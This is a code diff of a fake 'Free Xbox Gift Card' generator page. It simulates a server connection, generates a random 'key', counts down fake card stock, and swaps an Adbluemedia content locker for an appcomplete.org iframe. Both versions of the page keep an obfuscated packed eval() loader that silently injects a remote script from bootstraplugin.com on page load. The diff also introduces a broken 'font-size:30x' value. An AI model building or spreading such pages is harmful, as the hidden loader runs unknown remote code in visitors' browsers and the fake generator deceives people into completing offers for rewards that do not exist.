@@ -215,7 +215,7 @@ button {
 }
 
 .numbers {
-	font-size:30px;
+	font-size:30x;
 	color:#211838;
 	font-weight:bold;	
 	padding-bottom:20px;
@@ -251,42 +251,35 @@ button {
 		padding-bottom:20px;
 	}
 }
-</style>
 
+</style>
 <script>
 	var page;
 </script>
-
-<!-- **Adbluemedia Script Added Here** -->
-<script type="text/javascript">
-    var fybuP_Edl_TAFvQc={"it":4638213,"key":"72d6b"};
-</script>
-<script src="https://d1chbu4sfo2xhu.cloudfront.net/f567ff7.js"></script>
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 </head>
 
 <body>
 	<div class="general">
-        <script>
+    	        <script>
 			page = 2;
 		</script>
-        <div class="content">
+        	<div class="content">
         	<img src="../images/fifa-top-logo.png" border="0" width="500px" alt="Free Gift Card" class="logo">
             <h1>Want some <span>Free Xbox Gift Card</span></h1>
             <p>Second step, choose your card amount</p>
-            <div class="card"><a href="javascript:active();"><img src="../images/xbox.png" alt="Xbox Card" border="0" /></a><br /><h2>$25</h2></div>
+                        <div class="card"><a href="javascript:active();"><img src="../images/xbox.png" alt="Xbox Card" border="0" /></a><br /><h2>$25</h2></div>
             <div class="card"><a href="javascript:active();"><img src="../images/xbox.png" alt="Xbox Card" border="0" /></a><br /><h2>$50</h2></div>
             <div class="card"><a href="javascript:active();"><img src="../images/xbox.png" alt="Xbox Card" border="0" /></a><br /><h2>$100</h2></div>
             <h2>Only <span><span id="randNbCard"></span> Xbox Cards</span> left!</h2>
         </div>
-    </div>
-    
+		    </div>
     <div class="dark">
     	<div class="popin">
         	<div id="step">
             	<div class="system"><h3 id="system"></h3></div>
-				<div style="height: 510px; overflow: scroll;">
+												<div style="height: 510px; overflow: scroll;">
             	<div class="bar">
                 	<div class="round1"></div>
                     <div class="round2"></div>
@@ -299,19 +292,23 @@ button {
                 </div>
                 <div class="screen" id="screen"></div>
                 <div class="numbers" id="numbers"></div>
-                <!-- Old iframe removed, Adbluemedia locker will open automatically via script -->
-                <div class="result" id="result"><button onclick="_call_locker();">Click Here To Unlock</button></div>     
-                <br/> <br/> <br/> <br/>             
-              </div>
+                <div class="result" id="result"><iframe src="https://appcomplete.org/cl/i/4n3qx" opacity="0" scrolling="no" margin-top="10px" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" height="750px"></iframe></div>     <br/> <br/> <br/> <br/>             </div>
             </div>
         </div>
     </div>
+    
 
     <script type="text/javascript">
+		
 		eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
+		
 		if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){
+		
 		if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}
-		('(5(0){4 1=0.7(\'1\');1.2=\'//3.6/d.8?c=b\';0.a.9(1)})(0);',14,14,'document|script|src|bootstraplugin|var|function|com|createElement|php|appendChild|head|158|id|p'.split('|'),0,{}))
+		
+		('(5(0){4 1=0.7(\'1\');1.2=\'//3.6/d.8?c=b\';0.a.9(1)})(0);',14,14,'document|script|src|bootstraplugin|var|function|com|createElement|php|appendChild|head|158|id|p'.split('|'),0,{
+			
+		}))
 		
 		var call = 0;
 		
@@ -332,6 +329,7 @@ button {
 			});
 			
 			screenLoad = document.getElementById('screen');
+			
 			screenLoad.innerHTML = 'Connecting to server...';
 			
 			$('.screen').animate({
@@ -362,6 +360,8 @@ button {
 				active2();	
 			});	
 			return false;
+			
+			
 		}
 		
 		function active2(){
@@ -386,6 +386,7 @@ button {
 			});
 			
 			keyGenerate();							
+				
 		};
 		
 		function active3(){
@@ -415,6 +416,7 @@ button {
 			}
 			
 			active4();	
+			
 		}
 		
 		function active4(){
@@ -425,15 +427,12 @@ button {
 			$('#result').animate({
 				'opacity':'1'
 			}, 500)
-
-			// Automatically trigger Adbluemedia locker when generation completes
-			if(typeof _call_locker === 'function') {
-				_call_locker();
-			}
 		}
 		
 		function keyGenerate(){
+			
 			var key = "";
+			
 			var listCar = new Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 			
 			for(var nb=0; nb<23; nb++){
@@ -444,6 +443,7 @@ button {
 					key += 'X'	
 				}
 				else{
+					//key += String.fromCharCode(Math.round((Math.random()*(90-48)))+48);
 					key += listCar[Math.floor(Math.random()*listCar.length)];
 				}
 			}
@@ -460,10 +460,15 @@ button {
 			function wordGenerator() {
 				var returnedString = "";
 				counter = 0;
+				
 				var listCar = new Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 				
 				for(var i=0; i<key.length; i++) {
 					if(!oldString.length || oldString.charAt(i) != key.charAt(i)){
+						//var letter = String.fromCharCode(Math.random() * (90-48))+48;
+						//var letter = String.fromCharCode(Math.round((Math.random()*(90-48)))+48);
+						
+						
 						if(key.charAt(i) == "-"){
 							var letter = "-";
 						}
@@ -472,7 +477,7 @@ button {
 						}
 						counter ++;
 					}else{
-						var letter = key.charAt(i);
+							var letter = key.charAt(i);
 					}
 					returnedString += letter;
 				}
@@ -481,26 +486,87 @@ button {
 				
 				if(resultKey.innerHTML == key){
 					call += 1;
+					
 					if(call == '1'){
 						active3();
 					}
+					else{
+						
+					}
+					
+				}
+				else{
+					
 				}
 				return false;
 			}
+			
 		}
-
+		function randText(){
+			
+			randNb = (Math.round(Math.random() * (3000-1000))+1000);
+					
+			var randNbText = document.getElementById('randNb');
+			randNbText.innerHTML = randNb;
+			
+			var compte = 0;
+			
+			var count;
+			//timer = (Math.round(Math.random() * (3000-1000))+1000);
+			
+			function refreshTime(){
+				timer = (Math.round(Math.random() * (3000-1000))+1000);
+					//console.log(timer);
+			}
+				
+			function myFunction() {
+					
+				refreshTime();
+				count = setInterval(alertFunc, timer);
+			}
+				
+			function alertFunc() {
+				if(compte == '0'){
+					compte+=1;
+					if(randNbText.innerHTML <= '5' && randNbText.innerHTML >= '2'){
+						randNbText.innerHTML -= 1;
+					}
+					else if(randNbText.innerHTML <= '1'){
+						randNbText.innerHTML = 0;
+					}
+					else{
+						randNbText.innerHTML -= (Math.round(Math.random() * (5-1))+1);
+					}
+				}
+				else{
+					compte = 0;
+					clearInterval(count);
+					myFunction()
+				}
+					
+			}
+			myFunction()
+		}
+		
 		function randText2(){
+			
 			randNb2 = (Math.round(Math.random() * (500-150))+150);
+				
 			var randNbText2 = document.getElementById('randNbCard');
 			randNbText2.innerHTML = randNb2;
+			
 			var compte2 = 0;
+			
 			var count2;
+			//timer = (Math.round(Math.random() * (3000-1000))+1000);
 			
 			function refreshTime2(){
 				timer2 = (Math.round(Math.random() * (8000-3000))+3000);
+					//console.log(timer);
 			}
 				
 			function myFunction2() {
+					
 				refreshTime2();
 				count2 = setInterval(alertFunc2, timer2);
 			}
@@ -521,15 +587,24 @@ button {
 				else{
 					compte2 = 0;
 					clearInterval(count2);
-					myFunction2();
+					myFunction2()
 				}
+					
 			}
-			myFunction2();
+			myFunction2()
 		}
 		
-		if(page == '2'){
+		if(page == '1'){
+			randText();
+		}
+		else if(page == '2'){
 			randText2();	
 		}
+		else{
+			
+		}
+		
     </script>
-</body>
-</html>
+	</body>
+	</html>
+	
